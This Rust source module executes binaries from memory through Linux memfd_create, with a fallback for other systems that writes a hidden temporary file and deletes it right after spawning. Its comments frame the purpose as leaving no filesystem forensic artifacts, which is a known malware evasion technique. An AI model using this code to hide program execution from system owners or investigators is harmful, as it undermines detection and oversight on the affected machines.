// Fileless process execution via memfd_create (Linux).
// Executes binaries entirely from memory without touching disk.
// No fs::write, no temp files, no filesystem forensic artifacts.

use std::io;
use std::io::Write;
use std::process::Command;
use tracing::info;

#[cfg(target_os = "linux")]
use std::os::unix::io::{FromRawFd, IntoRawFd};

#[cfg(target_os = "linux")]
use std::os::unix::process::CommandExt;

// ── Linux: memfd_create ──────────────────────────────────────────────────────

#[cfg(target_os = "linux")]
pub struct MemfdBinary {
    fd: i32,
    name: String,
}

#[cfg(target_os = "linux")]
impl MemfdBinary {
    pub fn new(name: &str, binary_data: &[u8]) -> io::Result<Self> {
        let cname = std::ffi::CString::new(name).unwrap();
        let fd = unsafe {
            libc::memfd_create(cname.as_ptr(), libc::MFD_CLOEXEC)
        };

        if fd == -1 {
            return Err(io::Error::last_os_error());
        }

        let mut file = unsafe { std::fs::File::from_raw_fd(fd) };
        if let Err(e) = file.write_all(binary_data) {
            unsafe { libc::close(fd); }
            return Err(e);
        }

        let raw_fd = file.into_raw_fd();

        Ok(Self { fd: raw_fd, name: name.to_string() })
    }

    pub fn spawn(&self, env_vars: &[(&str, &str)]) -> io::Result<std::process::Child> {
        let fd_path = format!("/proc/self/fd/{}", self.fd);

        let mut cmd = Command::new(&fd_path);
        for (key, val) in env_vars {
            cmd.env(key, val);
        }

        unsafe {
            cmd.pre_exec(|| Ok(()));
        }

        let child = cmd.spawn()?;
        info!("Fileless spawn: {} (PID: {}, fd: {})", self.name, child.id(), self.fd);
        Ok(child)
    }

    pub fn raw_fd(&self) -> i32 { self.fd }

    pub fn seal(&self) -> io::Result<()> {
        let rc = unsafe {
            libc::fcntl(self.fd, libc::F_ADD_SEALS,
                libc::F_SEAL_SEAL | libc::F_SEAL_SHRINK | libc::F_SEAL_GROW | libc::F_SEAL_WRITE)
        };
        if rc == -1 { Err(io::Error::last_os_error()) } else { Ok(()) }
    }
}

#[cfg(target_os = "linux")]
impl Drop for MemfdBinary {
    fn drop(&mut self) {
        unsafe { libc::close(self.fd); }
    }
}

// ── Non-Linux fallback ───────────────────────────────────────────────────────

#[cfg(not(target_os = "linux"))]
pub struct MemfdBinary {
    data: Vec<u8>,
    name: String,
}

#[cfg(not(target_os = "linux"))]
impl MemfdBinary {
    pub fn new(name: &str, binary_data: &[u8]) -> io::Result<Self> {
        Ok(Self { data: binary_data.to_vec(), name: name.to_string() })
    }

    pub fn spawn(&self, env_vars: &[(&str, &str)]) -> io::Result<std::process::Child> {
        let temp_dir = std::env::temp_dir();
        let temp_path = temp_dir.join(format!(".{}_{}", self.name, uuid::Uuid::new_v4()));
        std::fs::write(&temp_path, &self.data)?;

        let mut cmd = Command::new(&temp_path);
        for (key, val) in env_vars {
            cmd.env(key, val);
        }

        let child = cmd.spawn();
        let _ = std::fs::remove_file(&temp_path);
        child
    }

    pub fn raw_fd(&self) -> i32 { -1 }
    pub fn seal(&self) -> io::Result<()> { Ok(()) }
}
